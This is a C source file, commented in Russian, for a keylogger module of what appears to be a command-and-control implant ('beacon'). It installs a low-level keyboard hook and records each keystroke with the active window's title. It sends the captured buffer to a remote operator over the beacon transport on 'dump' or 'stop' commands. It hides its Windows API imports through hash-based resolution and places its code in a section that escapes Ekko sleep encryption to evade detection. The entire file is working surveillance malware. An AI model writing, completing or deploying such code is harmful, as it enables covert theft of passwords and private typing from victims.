// cmd_keylogger.c — WH_KEYBOARD_LL keylogger через api_resolve (no direct imports).
//
// Синтаксис:
//   keylogger start  — установить хук, начать буферизацию
//   keylogger dump   — сбросить буфер в консоль, не останавливая хук
//   keylogger stop   — сбросить буфер и снять хук
//
// Все функции, константы и строковые литералы этого TU помещены в секцию .sleep:
//   #pragma code_seg(".sleep")   — весь код
//   #pragma const_seg(".sleep")  — все строковые литералы (иначе шли бы в .rdata)
// Sekция .sleep не шифруется Ekko, поэтому хук-колбэк безопасен в период сна.

#include "../core/beacon.h"

#pragma code_seg(".sleep")
#pragma const_seg(".sleepd")

// ---- API-типы ---------------------------------------------------------------

typedef HHOOK   (WINAPI *pfn_SetWindowsHookExW)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL    (WINAPI *pfn_UnhookWindowsHookEx)(HHOOK);
typedef LRESULT (WINAPI *pfn_CallNextHookEx)(HHOOK, int, WPARAM, LPARAM);
typedef BOOL    (WINAPI *pfn_GetMessageW)(LPMSG, HWND, UINT, UINT);
typedef BOOL    (WINAPI *pfn_PostThreadMessageW)(DWORD, UINT, WPARAM, LPARAM);
typedef HWND    (WINAPI *pfn_GetForegroundWindow)(void);
typedef int     (WINAPI *pfn_GetWindowTextW)(HWND, LPWSTR, int);
typedef SHORT   (WINAPI *pfn_GetKeyState)(int);
typedef HANDLE  (WINAPI *pfn_CreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                    LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD   (WINAPI *pfn_WaitForSingleObject)(HANDLE, DWORD);

// ---- Кэши разрешённых указателей (.data — не затронуты pragma) --------------

static void* g_SetHookEx      = NULL;
static void* g_UnhookHookEx   = NULL;
static void* g_CallNextHook   = NULL;
static void* g_GetMsg         = NULL;
static void* g_PostThreadMsg  = NULL;
static void* g_GetForeground  = NULL;
static void* g_GetWinText     = NULL;
static void* g_GetKeyState    = NULL;
static void* g_CreateThread_  = NULL;
static void* g_WaitSingle     = NULL;

// ---- Глобальное состояние (.data) -------------------------------------------

static HHOOK           g_hook    = NULL;
static HANDLE          g_thread  = NULL;
static DWORD           g_tid     = 0;
static volatile int    g_running = 0;

#define KL_CAP        (256u * 1024u)   // максимальный размер буфера
#define KL_FLUSH_SIZE (64u  * 1024u)   // размер одного чанка при сбросе
static char*           g_buf = NULL;
static volatile DWORD  g_len = 0;

static wchar_t g_last_title[256];

// ---- Таблица специальных клавиш (.data: нет const) --------------------------

static struct { BYTE vk; char str[10]; } kSpecial[] = {
    {VK_RETURN,  "[ENTER]\n"}, {VK_BACK,    "[BS]"},
    {VK_TAB,     "[TAB]"},     {VK_ESCAPE,  "[ESC]"},
    {VK_DELETE,  "[DEL]"},     {VK_INSERT,  "[INS]"},
    {VK_HOME,    "[HOME]"},    {VK_END,     "[END]"},
    {VK_PRIOR,   "[PGUP]"},    {VK_NEXT,    "[PGDN]"},
    {VK_LEFT,    "[<-]"},      {VK_RIGHT,   "[->]"},
    {VK_UP,      "[^]"},       {VK_DOWN,    "[v]"},
    {VK_F1,  "[F1]"}, {VK_F2,  "[F2]"}, {VK_F3,  "[F3]"},
    {VK_F4,  "[F4]"}, {VK_F5,  "[F5]"}, {VK_F6,  "[F6]"},
    {VK_F7,  "[F7]"}, {VK_F8,  "[F8]"}, {VK_F9,  "[F9]"},
    {VK_F10, "[F10]"},{VK_F11, "[F11]"},{VK_F12, "[F12]"},
    {0, ""}
};

static char kShiftDigits[] = ")!@#$%^&*(";

static struct { BYTE vk; char n; char s; } kPunct[] = {
    {VK_OEM_MINUS,  '-','_'}, {VK_OEM_PLUS,   '=','+'},
    {VK_OEM_4,      '[','{'}, {VK_OEM_6,       ']','}'},
    {VK_OEM_5,     '\\','|'}, {VK_OEM_1,       ';',':'},
    {VK_OEM_7,     '\'','"'}, {VK_OEM_COMMA,   ',','<'},
    {VK_OEM_PERIOD, '.','>'}, {VK_OEM_2,        '/','?'},
    {VK_OEM_3,      '`','~'}, {0, 0, 0}
};

// ---- Отладочный лог ---------------------------------------------------------
// kl.log пишется рядом с рабочим каталогом процесса.
// Строковый литерал пути теперь в .sleep — нет опасности шифрования.

static void kl_log(const char* msg, DWORD len) {
    OutputDebugStringA(msg);
    // File logging — writes kl.log to the working directory.
    // HANDLE h = CreateFileA("kl.log", FILE_APPEND_DATA,
    //                        FILE_SHARE_READ | FILE_SHARE_WRITE,
    //                        NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    // if (h != INVALID_HANDLE_VALUE) {
    //     DWORD wr;
    //     WriteFile(h, msg, len, &wr, NULL);
    //     CloseHandle(h);
    // }
    (void)len;
}
#define KL_LOG(s) kl_log((s), (DWORD)(sizeof(s) - 1))

// ---- Вспомогательный memcpy -------------------------------------------------
// rt_memcpy в .text — заменяем своей копией в .sleep.

static void kl_memcpy(void* dst, const void* src, DWORD n) {
    BYTE* d = (BYTE*)dst;
    const BYTE* s = (const BYTE*)src;
    while (n--) *d++ = *s++;
}

// ---- Буферные хелперы -------------------------------------------------------

static void kl_append(const char* s, DWORD n) {
    if (!g_buf) return;
    if (g_len + n >= KL_CAP) return;
    kl_memcpy(g_buf + g_len, s, n);
    g_len += n;
}

static void kl_appends(const char* s) {
    DWORD l = 0; while (s[l]) l++;
    kl_append(s, l);
}

// ---- Смена окна: добавить заголовок -----------------------------------------

static void kl_maybe_header(HWND hw) {
    KL_LOG("kl_maybe_header: enter\n");
    // static — буфер в .data, не на стеке хук-колбэка.
    static wchar_t title[256];
    ((pfn_GetWindowTextW)g_GetWinText)(hw, title, 255);
    KL_LOG("kl_maybe_header: after GetWindowTextW\n");

    int same = 1;
    for (int i = 0; i < 256; i++) {
        if (title[i] != g_last_title[i]) { same = 0; break; }
        if (!title[i]) break;
    }
    if (same) { KL_LOG("kl_maybe_header: same title, skip\n"); return; }
    KL_LOG("kl_maybe_header: title changed, writing\n");
    { int i = 0; while (i < 255 && title[i]) { g_last_title[i] = title[i]; i++; } g_last_title[i] = 0; }
    KL_LOG("kl_maybe_header: after copy\n");
    KL_LOG("kl_maybe_header: before appends open\n");
    kl_append("\n", 1);
    KL_LOG("kl_maybe_header: after newline\n");
    kl_append("[", 1);
    KL_LOG("kl_maybe_header: after open bracket\n");
    for (int i = 0; title[i] && i < 200; i++) {
        char c = (title[i] < 128) ? (char)title[i] : '?';
        kl_append(&c, 1);
    }
    KL_LOG("kl_maybe_header: after title chars\n");
    kl_append("]", 1);
    kl_append("\n", 1);
    KL_LOG("kl_maybe_header: done\n");
}

// ---- Декодирование VK-кода --------------------------------------------------

static void kl_decode(DWORD vk) {
    KL_LOG("kl_decode: enter\n");
    if (vk == VK_SHIFT    || vk == VK_LSHIFT   || vk == VK_RSHIFT  ||
        vk == VK_CONTROL  || vk == VK_LCONTROL  || vk == VK_RCONTROL||
        vk == VK_MENU     || vk == VK_LMENU     || vk == VK_RMENU   ||
        vk == VK_LWIN     || vk == VK_RWIN      ||
        vk == VK_CAPITAL  || vk == VK_NUMLOCK   || vk == VK_SCROLL)
        return;

    KL_LOG("kl_decode: past modifiers\n");
    pfn_GetKeyState pGKS = (pfn_GetKeyState)g_GetKeyState;
    int shift = (pGKS(VK_SHIFT)   & 0x8000) != 0;
    int caps  = (pGKS(VK_CAPITAL) & 0x0001) != 0;
    KL_LOG("kl_decode: got shift/caps\n");

    for (int i = 0; kSpecial[i].vk; i++) {
        if (kSpecial[i].vk == (BYTE)vk) { kl_appends(kSpecial[i].str); return; }
    }

    if (vk >= 'A' && vk <= 'Z') {
        char c = (char)((shift ^ caps) ? vk : vk + 32);
        kl_append(&c, 1); return;
    }

    if (vk >= '0' && vk <= '9') {
        char c = shift ? kShiftDigits[vk - '0'] : (char)vk;
        kl_append(&c, 1); return;
    }

    if (vk == VK_SPACE) { kl_append(" ", 1); return; }

    if (vk >= VK_NUMPAD0 && vk <= VK_NUMPAD9) {
        char c = (char)('0' + vk - VK_NUMPAD0);
        kl_append(&c, 1); return;
    }

    if (vk == VK_MULTIPLY) { kl_append("*", 1); return; }
    if (vk == VK_ADD)      { kl_append("+", 1); return; }
    if (vk == VK_SUBTRACT) { kl_append("-", 1); return; }
    if (vk == VK_DECIMAL)  { kl_append(".", 1); return; }
    if (vk == VK_DIVIDE)   { kl_append("/", 1); return; }

    for (int i = 0; kPunct[i].vk; i++) {
        if (kPunct[i].vk == (BYTE)vk) {
            char c = shift ? kPunct[i].s : kPunct[i].n;
            kl_append(&c, 1); return;
        }
    }

    // Неизвестный VK — hex-код.
    char hex[5] = "[00]";
    BYTE hi = (BYTE)(vk >> 4), lo = (BYTE)(vk & 0xF);
    hex[1] = (char)(hi < 10 ? '0' + hi : 'A' + hi - 10);
    hex[2] = (char)(lo < 10 ? '0' + lo : 'A' + lo - 10);
    kl_append(hex, 4);
}

// ---- Low-level keyboard hook callback ---------------------------------------

static LRESULT CALLBACK kl_hook_proc(int nCode, WPARAM wParam, LPARAM lParam) {
    KL_LOG("kl_hook_proc: enter\n");
    if (nCode == HC_ACTION &&
        (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KL_LOG("kl_hook_proc: in keydown block\n");
        KBDLLHOOKSTRUCT* ks = (KBDLLHOOKSTRUCT*)lParam;
        KL_LOG("kl_hook_proc: before GetForeground\n");
        HWND fw = ((pfn_GetForegroundWindow)g_GetForeground)();
        KL_LOG("kl_hook_proc: before maybe_header\n");
        if (fw) kl_maybe_header(fw);
        KL_LOG("kl_hook_proc: before decode\n");
        kl_decode(ks->vkCode);
        KL_LOG("kl_hook_proc: decode done\n");
    }
    KL_LOG("kl_hook_proc: call next\n");
    return ((pfn_CallNextHookEx)g_CallNextHook)(g_hook, nCode, wParam, lParam);
}

// ---- Поток хука -------------------------------------------------------------

static DWORD WINAPI kl_thread_proc(LPVOID arg) {
    (void)arg;

    KL_LOG("kl_thread_proc: SetWindowsHookExW\n");
    g_hook = ((pfn_SetWindowsHookExW)g_SetHookEx)(
                 WH_KEYBOARD_LL, kl_hook_proc, NULL, 0);
    if (!g_hook) { KL_LOG("kl_thread_proc: hook FAILED\n"); g_running = 0; return 1; }
    KL_LOG("kl_thread_proc: hook set, entering GetMessage loop\n");

    MSG msg;
    while (g_running &&
           ((pfn_GetMessageW)g_GetMsg)(&msg, NULL, 0, 0) > 0) {
        /* hook dispatch inside GetMessageW */
    }

    ((pfn_UnhookWindowsHookEx)g_UnhookHookEx)(g_hook);
    g_hook    = NULL;
    g_running = 0;
    return 0;
}

// ---- Разрешение API ---------------------------------------------------------

static int kl_resolve(void) {
    uint32_t hu = api_hash_w(L"user32.dll");
    uint32_t hk = api_hash_w(L"kernel32.dll");

    if (!g_SetHookEx)     g_SetHookEx     = api_resolve(hu, api_hash("SetWindowsHookExW"));
    if (!g_UnhookHookEx)  g_UnhookHookEx  = api_resolve(hu, api_hash("UnhookWindowsHookEx"));
    if (!g_CallNextHook)  g_CallNextHook  = api_resolve(hu, api_hash("CallNextHookEx"));
    if (!g_GetMsg)        g_GetMsg        = api_resolve(hu, api_hash("GetMessageW"));
    if (!g_PostThreadMsg) g_PostThreadMsg = api_resolve(hu, api_hash("PostThreadMessageW"));
    if (!g_GetForeground) g_GetForeground = api_resolve(hu, api_hash("GetForegroundWindow"));
    if (!g_GetWinText)    g_GetWinText    = api_resolve(hu, api_hash("GetWindowTextW"));
    if (!g_GetKeyState)   g_GetKeyState   = api_resolve(hu, api_hash("GetKeyState"));
    if (!g_CreateThread_) g_CreateThread_ = api_resolve(hk, api_hash("CreateThread"));
    if (!g_WaitSingle)    g_WaitSingle    = api_resolve(hk, api_hash("WaitForSingleObject"));

    return (g_SetHookEx && g_UnhookHookEx && g_CallNextHook &&
            g_GetMsg && g_PostThreadMsg && g_GetForeground &&
            g_GetWinText && g_GetKeyState &&
            g_CreateThread_ && g_WaitSingle) ? 1 : 0;
}

// ---- Публичная точка входа --------------------------------------------------

void cmd_keylogger(const BeaconTask* t) {
    char cmd[16] = {0};
    kv_get_str(t->pay, t->pay_len, "cmd", cmd, sizeof(cmd));

    // --- start ----------------------------------------------------------------
    if (cmd[0]=='s' && cmd[1]=='t' && cmd[2]=='a') {
        if (g_running) {
            out_write("[*] keylogger: already running\n", 31);
            return;
        }
        if (!kl_resolve()) {
            out_write("[!] keylogger: API resolve failed\n", 34);
            return;
        }
        g_buf = (char*)bmalloc(KL_CAP);
        if (!g_buf) {
            out_write("[!] keylogger: out of memory\n", 29);
            return;
        }
        g_len = 0;
        rt_memset(g_buf, 0, KL_CAP);
        rt_memset(g_last_title, 0, sizeof(g_last_title));

        g_running = 1;
        g_thread  = ((pfn_CreateThread)g_CreateThread_)(
                        NULL, 0, kl_thread_proc, NULL, 0, &g_tid);
        if (!g_thread) {
            g_running = 0;
            bfree(g_buf); g_buf = NULL;
            out_write("[!] keylogger: CreateThread failed\n", 35);
            return;
        }
        out_write("[*] keylogger: started\n", 23);
        return;
    }

    // --- dump -----------------------------------------------------------------
    if (cmd[0]=='d') {
        const TransportVtbl* tv = get_transport();
        if (!g_running) {
            out_write("[*] keylogger: not running\n", 27);
            out_flush_chunk(tv, 1);
            return;
        }
        DWORD snap = g_len;
        if (snap == 0) {
            out_write("[*] keylogger: buffer empty\n", 28);
            out_flush_chunk(tv, 1);
            return;
        }
        // Сброс чанками — оператор видит данные по мере отправки.
        DWORD sent = 0;
        while (sent < snap) {
            DWORD chunk = snap - sent;
            if (chunk > KL_FLUSH_SIZE) chunk = KL_FLUSH_SIZE;
            out_write(g_buf + sent, chunk);
            sent += chunk;
            out_flush_chunk(tv, sent >= snap ? 1 : 0);
        }
        // Сдвигаем непрочитанные нажатия в начало буфера.
        DWORD tail = g_len - snap;
        if (tail > 0) kl_memcpy(g_buf, g_buf + snap, tail);
        g_len = tail;
        return;
    }

    // --- stop -----------------------------------------------------------------
    if (cmd[0]=='s' && cmd[1]=='t' && cmd[2]=='o') {
        if (!g_running) {
            out_write("[*] keylogger: not running\n", 27);
            return;
        }

        g_running = 0;
        if (g_tid)
            ((pfn_PostThreadMessageW)g_PostThreadMsg)(g_tid, WM_QUIT, 0, 0);
        if (g_thread) {
            ((pfn_WaitForSingleObject)g_WaitSingle)(g_thread, 3000);
            CloseHandle(g_thread);
            g_thread = NULL;
            g_tid    = 0;
        }

        const TransportVtbl* tv = get_transport();
        DWORD snap = g_len;
        if (snap == 0) {
            out_write("[*] keylogger: buffer empty\n", 28);
            out_flush_chunk(tv, 1);
        } else {
            DWORD sent = 0;
            while (sent < snap) {
                DWORD chunk = snap - sent;
                if (chunk > KL_FLUSH_SIZE) chunk = KL_FLUSH_SIZE;
                out_write(g_buf + sent, chunk);
                sent += chunk;
                out_flush_chunk(tv, sent >= snap ? 1 : 0);
            }
        }

        bfree(g_buf);
        g_buf = NULL;
        g_len = 0;
        return;
    }

    out_write("[!] keylogger: usage: keylogger start | dump | stop\n", 52);
    out_flush_chunk(get_transport(), 1);
}
